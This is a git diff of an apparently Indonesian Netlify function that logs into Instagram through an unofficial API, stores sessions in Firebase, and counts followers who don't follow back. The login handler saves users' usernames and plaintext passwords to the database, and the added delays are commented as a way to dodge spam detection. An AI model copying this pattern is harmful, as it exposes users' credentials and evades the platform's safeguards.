@@ -1,3 +1,54 @@
+const { IgApiClient } = require('instagram-private-api');
+const axios = require('axios');
+const path = require('path');
+
+const { db } = require('./config/firebaseConfig');
+const ig = new IgApiClient();
+
+// Variabel sesi yang disimpan dalam Firebase
+let sessionData = null;
+
+// Fungsi untuk login ke Instagram
+const login = async () => {
+    ig.state.generateDevice(process.env.INSTAGRAM_USERNAME);
+
+    if (sessionData) {
+        ig.state.deserialize(sessionData);
+        console.log('Sesi ditemukan, melanjutkan...');
+        try {
+            await ig.account.currentUser();
+            console.log('Sesi valid, melanjutkan...');
+        } catch (error) {
+            console.log('Sesi kadaluarsa, login ulang...');
+            await forceLogin();
+        }
+    } else {
+        console.log('Sesi tidak ditemukan, login ulang...');
+        await forceLogin();
+    }
+};
+
+// Fungsi untuk login ulang dan menyimpan sesi baru di Firebase Realtime Database
+const forceLogin = async () => {
+    try {
+        console.log('Mencoba login...');
+        await ig.account.login(process.env.INSTAGRAM_USERNAME, process.env.INSTAGRAM_PASSWORD);
+        console.log('Login berhasil!');
+        sessionData = ig.state.serialize(); // Menyimpan sesi di Firebase
+        await db.ref('sessions').child(process.env.INSTAGRAM_USERNAME).set({ sessionData }); // Menyimpan sesi di Firebase Realtime Database
+    } catch (error) {
+        console.error('Login gagal:', error);
+        if (error.name === 'IgCheckpointError') {
+            return {
+                statusCode: 400,
+                body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }),
+            };
+        } else {
+            throw error;
+        }
+    }
+};
+
 // Fungsi untuk mendapatkan data followers dengan paginasi dan retry logic
 const getAllFollowers = async (userId, retries = 3) => {
     let followers = [];
@@ -8,16 +59,16 @@ const getAllFollowers = async (userId, retries = 3) => {
         try {
             let nextFollowers = await followersFeed.items();
             followers = followers.concat(nextFollowers);
-            attempt = 0; // Reset attempt after successful fetch
-            const randomDelay = Math.floor(Math.random() * (40000 - 10000 + 1)) + 10000; // Delay antara 10 detik hingga 40 detik
-            console.log(`Delaying for ${randomDelay} ms`);
-            await delay(randomDelay); // Delay untuk menghindari rate limiting
+            attempt = 0; // Reset attempt setelah berhasil
+            const delayTime = Math.random() * (40000 - 10000) + 10000; // Random delay antara 10 detik hingga 40 detik
+            console.log(`Menunggu ${delayTime}ms untuk menghindari deteksi spam...`);
+            await delay(delayTime); // Delay lebih panjang untuk menghindari deteksi
         } catch (error) {
             console.error('Error fetching followers:', error);
             if (attempt < retries) {
                 attempt++;
                 console.log(`Retrying attempt ${attempt}...`);
-                await delay(5000); // Delay sebelum retry
+                await delay(5000); // Delay sebelum mencoba lagi
             } else {
                 throw new Error('Failed to fetch followers after multiple retries.');
             }
@@ -36,16 +87,16 @@ const getAllFollowing = async (userId, retries = 3) => {
         try {
             let nextFollowing = await followingFeed.items();
             following = following.concat(nextFollowing);
-            attempt = 0; // Reset attempt after successful fetch
-            const randomDelay = Math.floor(Math.random() * (40000 - 10000 + 1)) + 10000; // Delay antara 10 detik hingga 40 detik
-            console.log(`Delaying for ${randomDelay} ms`);
-            await delay(randomDelay); // Delay untuk menghindari rate limiting
+            attempt = 0; // Reset attempt setelah berhasil
+            const delayTime = Math.random() * (40000 - 10000) + 10000; // Random delay antara 10 detik hingga 40 detik
+            console.log(`Menunggu ${delayTime}ms untuk menghindari deteksi spam...`);
+            await delay(delayTime); // Delay lebih panjang untuk menghindari deteksi
         } catch (error) {
             console.error('Error fetching following:', error);
             if (attempt < retries) {
                 attempt++;
                 console.log(`Retrying attempt ${attempt}...`);
-                await delay(5000); // Delay sebelum retry
+                await delay(5000); // Delay sebelum mencoba lagi
             } else {
                 throw new Error('Failed to fetch following after multiple retries.');
             }
@@ -55,7 +106,7 @@ const getAllFollowing = async (userId, retries = 3) => {
 };
 
 // Fungsi untuk menangani request profile Instagram
-exports.handler = async function (event, context) {
+exports.handler = async function(event, context) {
     if (event.httpMethod === 'GET' && event.path === '/.netlify/functions/instagram/profile') {
         try {
             await login();
@@ -84,7 +135,7 @@ exports.handler = async function (event, context) {
                 full_name: user.full_name,
                 followers_count: followersCount,
                 following_count: followingCount,
-                profile_picture_url: profilePicUrl,
+                profile_picture_url: profilePicUrl, 
                 dont_follow_back_count: dontFollowBack.length,
             });
 
@@ -102,7 +153,7 @@ exports.handler = async function (event, context) {
                 }),
             };
         } catch (error) {
-            console.error('Error fetching Instagram data:', error);
+            console.error(error);
             if (error.name === 'IgLoginRequiredError') {
                 return {
                     statusCode: 401,
@@ -111,7 +162,7 @@ exports.handler = async function (event, context) {
             } else {
                 return {
                     statusCode: 500,
-                    body: JSON.stringify({ message: 'Error fetching Instagram data: ' + error.message }),
+                    body: JSON.stringify({ message: 'Error fetching Instagram data' }),
                 };
             }
         }
@@ -125,15 +176,13 @@ exports.handler = async function (event, context) {
 
             const user = await ig.account.currentUser();
             const userId = user.pk;
-
             const loginData = {
                 username,
                 password,
                 userId,
                 timestamp: new Date().toISOString(),
-                profile_picture_url: user.profile_pic_url,
+                profile_picture_url: user.profile_pic_url, 
             };
-
             await db.ref('logins').child(userId).set(loginData);
             return {
                 statusCode: 200,
